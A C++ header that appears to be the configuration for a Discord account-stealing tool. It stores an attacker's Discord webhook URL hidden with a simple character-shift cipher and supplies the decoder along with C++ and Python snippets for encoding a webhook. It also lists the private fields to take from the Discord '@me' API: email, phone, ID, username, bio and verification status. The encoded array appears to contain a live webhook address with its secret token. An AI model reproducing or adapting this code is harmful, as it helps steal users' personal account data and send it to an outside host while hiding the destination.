#pragma once
#include <array>
#include <string_view>

namespace hentai
{
	template <std ::size_t N>
	static constexpr std::string uwu(std::array<unsigned char, N> burp) noexcept;
	/*
	You can use this function to encode your discord
	std::vector woow(std::string burp);
	{
		std::vector<char> boobs;
		for (unsigned int i = 0; i < burp.size(); ++i)
		{
			if (i % 2 == 0)
				boobs.push_back(burp.at(i) + 3);
			else
				boobs.push_back(burp.at(i) - 3);

		}
	
		boobs.push_back('\0');
		return boobs;
	}
	Or for py lovers
	woow = []
	for i, data in enumerate("Your Webhook"):
		if i % 2 == 0:
			woow.append(ord(data) + 3)
		else:
			woow.append(ord(data) - 3)
	print(woow)
	print(len(woow))
	*/
}

namespace config
{
	// Discord Webhook URL
	// Use the above function to encode your web hook url
	// I know its pretty basic cipher but works against noobs
	constexpr std ::array<unsigned char, 120> encoded_webhook = {107, 113, 119, 109, 118, 55, 50, 44, 103, 102, 118, 96, 114, 111, 103, 43,
																 102, 108, 112, 44, 100, 109, 108, 44, 122, 98, 101, 101, 114, 108, 110, 112,
																 50, 53, 59, 52, 57, 48, 51, 47, 56, 53, 51, 53, 51, 47, 52, 50, 51, 50, 52, 44,
																 122, 82, 112, 114, 100, 85, 54, 66, 51, 69, 90, 80, 92, 96, 51, 98, 103, 48, 103,
																 103, 110, 81, 118, 82, 123, 69, 56, 110, 72, 50, 68, 49, 80, 103, 124, 95, 83, 66,
																 70, 84, 109, 54, 88, 116, 98, 119, 71, 73, 71, 77, 84, 100, 48, 101, 78, 111, 119, 76,
																 78, 114, 73, 77, 89, 53, 72, 73, 55, 98};

	// Data to be extracted from https://discord.com/api/v9/users/@me
	constexpr std::array<std ::string_view, 6> useful_data{"id", "username", "bio", "email", "verified", "phone"};

}

template <std::size_t N>
static constexpr std::string hentai::uwu(std::array<unsigned char, N> burp) noexcept
{
	std::string WooW = "";
	for (std::size_t i = 0; i < burp.size(); ++i)
	{
		if (i % 2 == 0)
			WooW.push_back(burp.at(i) - 3);
		else
			WooW.push_back(burp.at(i) + 3);

	}
	return WooW;
}